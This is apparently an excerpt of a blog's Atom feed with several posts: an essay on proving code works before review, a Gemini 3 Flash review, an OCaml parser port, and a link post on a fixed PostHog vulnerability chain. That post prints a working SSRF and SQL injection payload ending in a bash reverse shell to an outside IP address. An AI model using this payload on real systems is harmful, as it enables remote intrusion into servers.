+    &lt;p&gt;In all of the debates about the value of AI-assistance in software development there's one depressing anecdote that I keep on seeing: the junior engineer, empowered by some class of LLM tool, who deposits giant, untested PRs on their coworkers - or open source maintainers - and expects the "code review" process to handle the rest.&lt;/p&gt;
+&lt;p&gt;This is rude, a waste of other people's time, and is honestly a dereliction of duty as a software developer.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Your job is to deliver code you have proven to work.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;As software engineers we don't just crank out code - in fact these days you could argue that's what the LLMs are for. We need to deliver &lt;em&gt;code that works&lt;/em&gt; - and we need to include &lt;em&gt;proof&lt;/em&gt; that it works as well.  Not doing that directly shifts the burden of the actual work to whoever is expected to review our code.&lt;/p&gt;
+&lt;h4 id="how-to-prove-it-works"&gt;How to prove it works&lt;/h4&gt;
+&lt;p&gt;There are two steps to proving a piece of code works. Neither is optional.&lt;/p&gt;
+&lt;p&gt;The first is &lt;strong&gt;manual testing&lt;/strong&gt;. If you haven't seen the code do the right thing yourself, that code doesn't work. If it does turn out to work, that's honestly just pure chance.&lt;/p&gt;
+&lt;p&gt;Manual testing skills are genuine skills that you need to develop. You need to be able to get the system into an initial state that demonstrates your change, then exercise the change, then check and demonstrate that it has the desired effect.&lt;/p&gt;
+&lt;p&gt;If possible I like to reduce these steps to a sequence of terminal commands which I can paste, along with their output, into a comment in the code review. Here's a &lt;a href="https://github.com/simonw/llm-gemini/issues/116#issuecomment-3666551798"&gt;recent example&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Some changes are harder to demonstrate. It's still your job to demonstrate them! Record a screen capture video and add that to the PR. Show your reviewers that the change you made actually works.&lt;/p&gt;
+&lt;p&gt;Once you've tested the happy path where everything works you can start trying the edge cases. Manual testing is a skill, and finding the things that break is the next level of that skill that helps define a senior engineer.&lt;/p&gt;
+&lt;p&gt;The second step in proving a change works is &lt;strong&gt;automated testing&lt;/strong&gt;. This is so much easier now that we have LLM tooling, which means there's no excuse at all for skipping this step.&lt;/p&gt;
+&lt;p&gt;Your contribution should &lt;a href="https://simonwillison.net/2022/Oct/29/the-perfect-commit/"&gt;bundle the change&lt;/a&gt; with an automated test that proves the change works. That test should fail if you revert the implementation.&lt;/p&gt;
+&lt;p&gt;The process for writing a test mirrors that of manual testing: get the system into an initial known state, exercise the change, assert that it worked correctly. Integrating a test harness to productively facilitate this is another key skill worth investing in.&lt;/p&gt;
+&lt;p&gt;Don't be tempted to skip the manual test because you think the automated test has you covered already! Almost every time I've done this myself I've quickly regretted it.&lt;/p&gt;
+&lt;h4 id="make-your-coding-agent-prove-it-first"&gt;Make your coding agent prove it first&lt;/h4&gt;
+&lt;p&gt;The most important trend in LLMs in 2025 has been the explosive growth of &lt;strong&gt;coding agents&lt;/strong&gt; - tools like Claude Code and Codex CLI that can actively execute the code they are working on to check that it works and further iterate on any problems.&lt;/p&gt;
+&lt;p&gt;To master these tools you need to learn how to get them to &lt;em&gt;prove their changes work&lt;/em&gt; as well.&lt;/p&gt;
+&lt;p&gt;This looks exactly the same as the process I described above: they need to be able to manually test their changes as they work, and they need to be able to build automated tests that guarantee the change will continue to work in the future.&lt;/p&gt;
+&lt;p&gt;Since they're robots, automated tests and manual tests are effectively the same thing.&lt;/p&gt;
+&lt;p&gt;They do feel a little different though. When I'm working on CLI tools I'll usually teach Claude Code how to run them itself so it can do one-off tests, even though the eventual automated tests will use a system like &lt;a href="https://click.palletsprojects.com/en/stable/testing/"&gt;Click's CLIRunner&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;When working on CSS changes I'll often encourage my coding agent to take screenshots when it needs to check if the change it made had the desired effect.&lt;/p&gt;
+&lt;p&gt;The good news about automated tests is that coding agents need very little encouragement to write them. If your project has tests already most agents will extend that test suite without you even telling them to do so. They'll also reuse patterns from existing tests, so keeping your test code well organized and populated with patterns you like is a great way to help your agent build testing code to your taste.&lt;/p&gt;
+&lt;p&gt;Developing good taste in testing code is another of those skills that differentiates a senior engineer.&lt;/p&gt;
+&lt;h4 id="the-human-provides-the-accountability"&gt;The human provides the accountability&lt;/h4&gt;
+&lt;p&gt;&lt;a href="https://simonwillison.net/2025/Feb/3/a-computer-can-never-be-held-accountable/"&gt;A computer can never be held accountable&lt;/a&gt;. That's your job as the human in the loop.&lt;/p&gt;
+&lt;p&gt;Almost anyone can prompt an LLM to generate a thousand-line patch and submit it for code review. That's no longer valuable. What's valuable is contributing &lt;em&gt;code that is proven to work&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;Next time you submit a PR, make sure you've included your evidence that it works as it should.&lt;/p&gt;
+    
+        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/programming"&gt;programming&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/careers"&gt;careers&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-assisted-programming"&gt;ai-assisted-programming&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-ethics"&gt;ai-ethics&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/vibe-coding"&gt;vibe-coding&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/coding-agents"&gt;coding-agents&lt;/a&gt;&lt;/p&gt;
+    
+
+</summary><category term="programming"/><category term="careers"/><category term="ai"/><category term="generative-ai"/><category term="llms"/><category term="ai-assisted-programming"/><category term="ai-ethics"/><category term="vibe-coding"/><category term="coding-agents"/></entry><entry><title>Inside PostHog: How SSRF, a ClickHouse SQL Escaping 0day, and Default PostgreSQL Credentials Formed an RCE Chain</title><link href="https://simonwillison.net/2025/Dec/18/ssrf-clickhouse-postgresql/#atom-everything" rel="alternate"/><published>2025-12-18T01:42:22+00:00</published><updated>2025-12-18T01:42:22+00:00</updated><id>https://simonwillison.net/2025/Dec/18/ssrf-clickhouse-postgresql/#atom-everything</id><summary type="html">
+    
+&lt;p&gt;&lt;strong&gt;&lt;a href="https://mdisec.com/inside-posthog-how-ssrf-a-clickhouse-sql-escaping-0day-and-default-postgresql-credentials-formed-an-rce-chain-zdi-25-099-zdi-25-097-zdi-25-096/"&gt;Inside PostHog: How SSRF, a ClickHouse SQL Escaping 0day, and Default PostgreSQL Credentials Formed an RCE Chain&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+Mehmet Ince describes a very elegant chain of attacks against the PostHog analytics platform, combining several different vulnerabilities (now all reported and fixed) to achieve RCE - Remote Code Execution - against an internal PostgreSQL server.&lt;/p&gt;
+&lt;p&gt;The way in abuses a webhooks system with non-robust URL validation, setting up a SSRF (Server-Side Request Forgery) attack where the server makes a request against an internal network resource.&lt;/p&gt;
+&lt;p&gt;Here's the URL that gets injected:&lt;/p&gt;
+&lt;p&gt;&lt;code style="word-break: break-all"&gt;http://clickhouse:8123/?query=SELECT+&lt;em&gt;+FROM+postgresql('db:5432','posthog',\"posthog_use'))+TO+STDOUT;END;DROP+TABLE+IF+EXISTS+cmd_exec;CREATE+TABLE+cmd_exec(cmd_output+text);COPY+cmd_exec+FROM+PROGRAM+$$bash+-c+\\"bash+-i+&amp;gt;%26+/dev/tcp/172.31.221.180/4444+0&amp;gt;%261\\"$$;SELECT+&lt;/em&gt;+FROM+cmd_exec;+--\",'posthog','posthog')#&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Reformatted a little for readability:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://clickhouse:8123/?query=
+SELECT *
+FROM postgresql(
+    'db:5432',
+    'posthog',
+    "posthog_use')) TO STDOUT;
+    END;
+    DROP TABLE IF EXISTS cmd_exec;
+    CREATE TABLE cmd_exec (
+        cmd_output text
+    );
+    COPY cmd_exec
+    FROM PROGRAM $$
+        bash -c \"bash -i &amp;gt;&amp;amp; /dev/tcp/172.31.221.180/4444 0&amp;gt;&amp;amp;1\"
+    $$;
+    SELECT * FROM cmd_exec;
+    --",
+    'posthog',
+    'posthog'
+)
+#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This abuses ClickHouse's ability to &lt;a href="https://clickhouse.com/docs/sql-reference/table-functions/postgresql#implementation-details"&gt;run its own queries against PostgreSQL&lt;/a&gt; using the &lt;code&gt;postgresql()&lt;/code&gt; table function, combined with an escaping bug in ClickHouse PostgreSQL function (&lt;a href="https://github.com/ClickHouse/ClickHouse/pull/74144"&gt;since fixed&lt;/a&gt;). Then &lt;em&gt;that&lt;/em&gt; query abuses PostgreSQL's ability to run shell commands via &lt;code&gt;COPY ... FROM PROGRAM&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;bash -c&lt;/code&gt; bit is particularly nasty - it opens a reverse shell such that an attacker with a machine at that IP address listening on port 4444 will receive a connection from the PostgreSQL server that can then be used to execute arbitrary commands.
+
+    &lt;p&gt;&lt;small&gt;&lt;/small&gt;Via &lt;a href="https://news.ycombinator.com/item?id=46305321"&gt;Hacker News&lt;/a&gt;&lt;/small&gt;&lt;/p&gt;
+
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/postgresql"&gt;postgresql&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/security"&gt;security&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/sql"&gt;sql&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/sql-injection"&gt;sql-injection&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/webhooks"&gt;webhooks&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/clickhouse"&gt;clickhouse&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="postgresql"/><category term="security"/><category term="sql"/><category term="sql-injection"/><category term="webhooks"/><category term="clickhouse"/></entry><entry><title>AoAH Day 15: Porting a complete HTML5 parser and browser test suite</title><link href="https://simonwillison.net/2025/Dec/17/vibespiling/#atom-everything" rel="alternate"/><published>2025-12-17T23:23:35+00:00</published><updated>2025-12-17T23:23:35+00:00</updated><id>https://simonwillison.net/2025/Dec/17/vibespiling/#atom-everything</id><summary type="html">
+    
+&lt;p&gt;&lt;strong&gt;&lt;a href="https://anil.recoil.org/notes/aoah-2025-15"&gt;AoAH Day 15: Porting a complete HTML5 parser and browser test suite&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+Anil Madhavapeddy is running an &lt;a href="https://anil.recoil.org/notes/aoah-2025"&gt;Advent of Agentic Humps&lt;/a&gt; this year, building a new useful OCaml library every day for most of December.&lt;/p&gt;
+&lt;p&gt;Inspired by Emil Stenström's &lt;a href="https://simonwillison.net/2025/Dec/14/justhtml/"&gt;JustHTML&lt;/a&gt; and my own coding agent &lt;a href="https://simonwillison.net/2025/Dec/15/porting-justhtml/"&gt;port of that to JavaScript&lt;/a&gt; he coined the term &lt;strong&gt;vibespiling&lt;/strong&gt; for AI-powered porting and transpiling of code from one language to another and had a go at building an HTML5 parser in OCaml, resulting in &lt;a href="https://tangled.org/anil.recoil.org/ocaml-html5rw"&gt;html5rw&lt;/a&gt; which passes the same &lt;a href="https://github.com/html5lib/html5lib-tests"&gt;html5lib-tests&lt;/a&gt; suite that Emil and myself used for our projects.&lt;/p&gt;
+&lt;p&gt;Anil's thoughts on the copyright and ethical aspects of this are worth quoting in full:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The question of copyright and licensing is difficult. I definitely did &lt;em&gt;some&lt;/em&gt; editing by hand, and a fair bit of prompting that resulted in targeted code edits, but the vast amount of architectural logic came from JustHTML. So I opted to make the &lt;a href="https://tangled.org/anil.recoil.org/ocaml-html5rw/blob/main/LICENSE.md"&gt;LICENSE a joint one&lt;/a&gt; with &lt;a href="https://friendlybit.com"&gt;Emil Stenström&lt;/a&gt;. I did not follow the transitive dependency through to the Rust one, which I probably should.&lt;/p&gt;
+&lt;p&gt;I'm also extremely uncertain about every releasing this library to the central opam repository, especially as there are &lt;a href="https://github.com/aantron/lambdasoup"&gt;excellent HTML5 parsers&lt;/a&gt; already available. I haven't checked if those pass the HTML5 test suite, because this is wandering into the agents &lt;em&gt;vs&lt;/em&gt; humans territory that I ruled out in my &lt;a href="https://anil.recoil.org/notes/aoah-2025#groundrules-for-the-advent-of-agentic-humps"&gt;groundrules&lt;/a&gt;. Whether or not this agentic code is better or not is a moot point if releasing it drives away the human maintainers who are the source of creativity in the code!&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;I decided to &lt;a href="https://github.com/simonw/justjshtml/commit/106289acee29045cc5afe9732915357063dfc37a"&gt;credit Emil in the same way&lt;/a&gt; for my own vibespiled project.
+
+    &lt;p&gt;&lt;small&gt;&lt;/small&gt;Via &lt;a href="https://twitter.com/avsm/status/2000979482744607216"&gt;@avsm&lt;/a&gt;&lt;/small&gt;&lt;/p&gt;
+
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/definitions"&gt;definitions&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/functional-programming"&gt;functional-programming&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-assisted-programming"&gt;ai-assisted-programming&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-ethics"&gt;ai-ethics&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/vibe-coding"&gt;vibe-coding&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ocaml"&gt;ocaml&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="definitions"/><category term="functional-programming"/><category term="ai"/><category term="generative-ai"/><category term="llms"/><category term="ai-assisted-programming"/><category term="ai-ethics"/><category term="vibe-coding"/><category term="ocaml"/></entry><entry><title>Gemini 3 Flash</title><link href="https://simonwillison.net/2025/Dec/17/gemini-3-flash/#atom-everything" rel="alternate"/><published>2025-12-17T22:44:52+00:00</published><updated>2025-12-17T22:44:52+00:00</updated><id>https://simonwillison.net/2025/Dec/17/gemini-3-flash/#atom-everything</id><summary type="html">
+    &lt;p&gt;It continues to be a busy December, if not quite as busy &lt;a href="https://simonwillison.net/2024/Dec/20/december-in-llms-has-been-a-lot/"&gt;as last year&lt;/a&gt;. Today's big news is &lt;a href="https://blog.google/technology/developers/build-with-gemini-3-flash/"&gt;Gemini 3 Flash&lt;/a&gt;, the latest in Google's "Flash" line of faster and less expensive models.&lt;/p&gt;
+&lt;p&gt;Google are emphasizing the comparison between the new Flash and their previous generation's top model Gemini 2.5 Pro:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Building on 3 Pro’s strong multimodal, coding and agentic features, 3 Flash offers powerful performance at less than a quarter the cost of 3 Pro, along with higher rate limits. The new 3 Flash model surpasses 2.5 Pro across many benchmarks while delivering faster speeds.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Gemini 3 Flash's characteristics are almost identical to Gemini 3 Pro: it accepts text, image, video, audio, and PDF, outputs only text, handles 1,048,576 maximum input tokens and up to 65,536 output tokens, and has the same knowledge cut-off date of January 2025 (also shared with the Gemini 2.5 series).&lt;/p&gt;
+&lt;p&gt;The benchmarks look good. The cost is appealing: 1/4 the price of Gemini 3 Pro ≤200k and 1/8 the price of Gemini 3 Pro &amp;gt;200k, and it's nice not to have a price increase for the new Flash at larger token lengths.&lt;/p&gt;
+&lt;p&gt;It's a little &lt;em&gt;more&lt;/em&gt; expensive than previous Flash models - Gemini 2.5 Flash was $0.30/million input tokens and $2.50/million on output, Gemini 3 Flash is $0.50/million and $3/million respectively.&lt;/p&gt;
+&lt;p&gt;Google &lt;a href="https://blog.google/products/gemini/gemini-3-flash/"&gt;claim&lt;/a&gt; it may still end up cheaper though, due to more efficient output token usage:&lt;/p&gt;
+&lt;blockquote&gt;&lt;p&gt;&gt; Gemini 3 Flash is able to modulate how much it thinks. It may think longer for more complex use cases, but it also uses 30% fewer tokens on average than 2.5 Pro.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;Here's &lt;a href="https://www.llm-prices.com/#it=100000&amp;amp;ot=10000&amp;amp;sel=gemini-3-flash-preview%2Cgemini-3-pro-preview%2Cgemini-3-pro-preview-200k%2Cgpt-5.2%2Cclaude-opus-4-5%2Cclaude-sonnet-4.5%2Cclaude-4.5-haiku%2Cgemini-2.5-flash%2Cgpt-5-mini"&gt;a more extensive price comparison&lt;/a&gt; on my &lt;a href="https://www.llm-prices.com/"&gt;llm-prices.com&lt;/a&gt; site.&lt;/p&gt;
+&lt;h4 id="generating-some-svgs-of-pelicans"&gt;Generating some SVGs of pelicans&lt;/h4&gt;
+&lt;p&gt;I released &lt;a href="https://github.com/simonw/llm-gemini/releases/tag/0.28"&gt;llm-gemini 0.28&lt;/a&gt; this morning with support for the new model. You can try it out like this:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;llm install -U llm-gemini
+llm keys set gemini # paste in key
+llm -m gemini-3-flash-preview "Generate an SVG of a pelican riding a bicycle"
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;According to &lt;a href="https://ai.google.dev/gemini-api/docs/gemini-3#thinking_level"&gt;the developer docs&lt;/a&gt; the new model supports four different thinking level options: &lt;code&gt;minimal&lt;/code&gt;, &lt;code&gt;low&lt;/code&gt;, &lt;code&gt;medium&lt;/code&gt;, and &lt;code&gt;high&lt;/code&gt;. This is different from Gemini 3 Pro, which only supported &lt;code&gt;low&lt;/code&gt; and &lt;code&gt;high&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;You can run those like this:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;llm -m gemini-3-flash-preview --thinking-level minimal "Generate an SVG of a pelican riding a bicycle"
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Here are four pelicans, for thinking levels &lt;a href="https://gist.github.com/simonw/8047c805a4a1df7fd4e854b18e7482d9"&gt;minimal&lt;/a&gt;, &lt;a href="https://gist.github.com/simonw/fb61686a1f915e3777b4a40e2df41068"&gt;low&lt;/a&gt;, &lt;a href="https://gist.github.com/simonw/190c3ce82cd8976827139bbc4dcc2d19"&gt;medium&lt;/a&gt;, and &lt;a href="https://gist.github.com/simonw/da66ffce135359161996e41e50e32ec3"&gt;high&lt;/a&gt;:&lt;/p&gt;
+&lt;image-gallery width="4"&gt;
+    &lt;img src="https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-minimal-pelican-svg.jpg" alt="A minimalist vector illustration of a stylized white bird with a long orange beak and a red cap riding a dark blue bicycle on a single grey ground line against a plain white background." /&gt;
+    &lt;img src="https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-low-pelican-svg.jpg" alt="Minimalist illustration: A stylized white bird with a large, wedge-shaped orange beak and a single black dot for an eye rides a red bicycle with black wheels and a yellow pedal against a solid light blue background." /&gt;
+    &lt;img src="https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-medium-pelican-svg.jpg" alt="A minimalist illustration of a stylized white bird with a large yellow beak riding a red road bicycle in a racing position on a light blue background." /&gt;
+    &lt;img src="https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-high-pelican-svg.jpg" alt="Minimalist line-art illustration of a stylized white bird with a large orange beak riding a simple black bicycle with one orange pedal, centered against a light blue circular background." /&gt;
+&lt;/image-gallery&gt;
+&lt;h4 id="i-built-the-gallery-component-with-gemini-3-flash"&gt;I built the gallery component with Gemini 3 Flash&lt;/h4&gt;
+&lt;p&gt;The gallery above uses a new Web Component which I built using Gemini 3 Flash to try out its coding abilities. The code on the page looks like this:&lt;/p&gt;
+&lt;div class="highlight highlight-text-html-basic"&gt;&lt;pre&gt;&lt;span class="pl-kos"&gt;&amp;lt;&lt;/span&gt;&lt;span class="pl-ent"&gt;image-gallery&lt;/span&gt; &lt;span class="pl-c1"&gt;width&lt;/span&gt;="&lt;span class="pl-s"&gt;4&lt;/span&gt;"&lt;span class="pl-kos"&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class="pl-kos"&gt;&amp;lt;&lt;/span&gt;&lt;span class="pl-ent"&gt;img&lt;/span&gt; &lt;span class="pl-c1"&gt;src&lt;/span&gt;="&lt;span class="pl-s"&gt;https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-minimal-pelican-svg.jpg&lt;/span&gt;" &lt;span class="pl-c1"&gt;alt&lt;/span&gt;="&lt;span class="pl-s"&gt;A minimalist vector illustration of a stylized white bird with a long orange beak and a red cap riding a dark blue bicycle on a single grey ground line against a plain white background.&lt;/span&gt;" &lt;span class="pl-kos"&gt;/&amp;gt;&lt;/span&gt;
+    &lt;span class="pl-kos"&gt;&amp;lt;&lt;/span&gt;&lt;span class="pl-ent"&gt;img&lt;/span&gt; &lt;span class="pl-c1"&gt;src&lt;/span&gt;="&lt;span class="pl-s"&gt;https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-low-pelican-svg.jpg&lt;/span&gt;" &lt;span class="pl-c1"&gt;alt&lt;/span&gt;="&lt;span class="pl-s"&gt;Minimalist illustration: A stylized white bird with a large, wedge-shaped orange beak and a single black dot for an eye rides a red bicycle with black wheels and a yellow pedal against a solid light blue background.&lt;/span&gt;" &lt;span class="pl-kos"&gt;/&amp;gt;&lt;/span&gt;
+    &lt;span class="pl-kos"&gt;&amp;lt;&lt;/span&gt;&lt;span class="pl-ent"&gt;img&lt;/span&gt; &lt;span class="pl-c1"&gt;src&lt;/span&gt;="&lt;span class="pl-s"&gt;https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-medium-pelican-svg.jpg&lt;/span&gt;" &lt;span class="pl-c1"&gt;alt&lt;/span&gt;="&lt;span class="pl-s"&gt;A minimalist illustration of a stylized white bird with a large yellow beak riding a red road bicycle in a racing position on a light blue background.&lt;/span&gt;" &lt;span class="pl-kos"&gt;/&amp;gt;&lt;/span&gt;
+    &lt;span class="pl-kos"&gt;&amp;lt;&lt;/span&gt;&lt;span class="pl-ent"&gt;img&lt;/span&gt; &lt;span class="pl-c1"&gt;src&lt;/span&gt;="&lt;span class="pl-s"&gt;https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-high-pelican-svg.jpg&lt;/span&gt;" &lt;span class="pl-c1"&gt;alt&lt;/span&gt;="&lt;span class="pl-s"&gt;Minimalist line-art illustration of a stylized white bird with a large orange beak riding a simple black bicycle with one orange pedal, centered against a light blue circular background.&lt;/span&gt;" &lt;span class="pl-kos"&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class="pl-kos"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="pl-ent"&gt;image-gallery&lt;/span&gt;&lt;span class="pl-kos"&gt;&amp;gt;&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Those alt attributes are all generated by Gemini 3 Flash as well, using this recipe:&lt;/p&gt;
+&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;llm -m gemini-3-flash-preview --system &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;
+&lt;span class="pl-s"&gt;You write alt text for any image pasted in by the user. Alt text is always presented in a&lt;/span&gt;
+&lt;span class="pl-s"&gt;fenced code block to make it easy to copy and paste out. It is always presented on a single&lt;/span&gt;
+&lt;span class="pl-s"&gt;line so it can be used easily in Markdown images. All text on the image (for screenshots etc)&lt;/span&gt;
+&lt;span class="pl-s"&gt;must be exactly included. A short note describing the nature of the image itself should go first.&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; \
+-a https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-high-pelican-svg.jpg&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;You can see the code that powers the image gallery Web Component &lt;a href="https://github.com/simonw/simonwillisonblog/blob/31651b3a527011d1c971d4256c1c9f61ef378d23/static/image-gallery.js"&gt;here on GitHub&lt;/a&gt;. I built it by prompting Gemini 3 Flash via &lt;a href="https://llm.datasette.io/"&gt;LLM&lt;/a&gt; like this:&lt;/p&gt;
+&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;llm -m gemini-3-flash-preview &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;
+&lt;span class="pl-s"&gt;Build a Web Component that implements a simple image gallery. Usage is like this:&lt;/span&gt;
+&lt;span class="pl-s"&gt;&lt;/span&gt;
+&lt;span class="pl-s"&gt;&amp;lt;image-gallery width="5"&amp;gt;&lt;/span&gt;
+&lt;span class="pl-s"&gt;  &amp;lt;img src="image1.jpg" alt="Image 1"&amp;gt;&lt;/span&gt;
+&lt;span class="pl-s"&gt;  &amp;lt;img src="image2.jpg" alt="Image 2" data-thumb="image2-thumb.jpg"&amp;gt;&lt;/span&gt;
+&lt;span class="pl-s"&gt;  &amp;lt;img src="image3.jpg" alt="Image 3"&amp;gt;&lt;/span&gt;
+&lt;span class="pl-s"&gt;&amp;lt;/image-gallery&amp;gt;&lt;/span&gt;
+&lt;span class="pl-s"&gt;&lt;/span&gt;
+&lt;span class="pl-s"&gt;If an image has a data-thumb= attribute that one is used instead, other images are scaled down. &lt;/span&gt;
+&lt;span class="pl-s"&gt;&lt;/span&gt;
+&lt;span class="pl-s"&gt;The image gallery always takes up 100% of available width. The width="5" attribute means that five images will be shown next to each other in each row. The default is 3. There are gaps between the images. When an image is clicked it opens a modal dialog with the full size image.&lt;/span&gt;
+&lt;span class="pl-s"&gt;&lt;/span&gt;
+&lt;span class="pl-s"&gt;Return a complete HTML file with both the implementation of the Web Component several example uses of it. Use https://picsum.photos/300/200 URLs for those example images.&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;It took a few follow-up prompts using &lt;code&gt;llm -c&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;llm -c &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;Use a real modal such that keyboard shortcuts and accessibility features work without extra JS&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;
+
+llm -c &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;Use X for the close icon and make it a bit more subtle&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;
+
+llm -c &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;remove the hover effect entirely&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;
+
+llm -c &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;I want no border on the close icon even when it is focused&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Here's &lt;a href="https://gist.github.com/simonw/09f63a49f29620d4cbbfd383cfee1db3"&gt;the full transcript&lt;/a&gt;, exported using &lt;code&gt;llm logs -cue&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Those five prompts took:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;225 input, 3,269 output&lt;/li&gt;
+&lt;li&gt;2,243 input, 2,908 output&lt;/li&gt;
+&lt;li&gt;4,319 input, 2,516 output&lt;/li&gt;
+&lt;li&gt;6,376 input, 2,094 output&lt;/li&gt;
+&lt;li&gt;8,151 input, 1,806 output&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Added together that's 21,314 input and 12,593 output for a grand total &lt;a href="https://www.llm-prices.com/#it=21314&amp;amp;ot=12593&amp;amp;sel=gemini-3-flash-preview"&gt;of 4.8436 cents&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;The guide to &lt;a href="https://ai.google.dev/gemini-api/docs/gemini-3#migrating_from_gemini_25"&gt;migrating from Gemini 2.5&lt;/a&gt; reveals one disappointment:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Image segmentation:&lt;/strong&gt; Image segmentation capabilities (returning pixel-level masks for objects) are not supported in Gemini 3 Pro or Gemini 3 Flash. For workloads requiring native image segmentation, we recommend continuing to utilize Gemini 2.5 Flash with thinking turned off or &lt;a href="https://ai.google.dev/gemini-api/docs/robotics-overview"&gt;Gemini Robotics-ER 1.5&lt;/a&gt;.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;I &lt;a href="https://simonwillison.net/2025/Apr/18/gemini-image-segmentation/"&gt;wrote about this capability in Gemini 2.5&lt;/a&gt; back in April. I hope they come back in future models - they're a really neat capability that is unique to Gemini.&lt;/p&gt;
+    
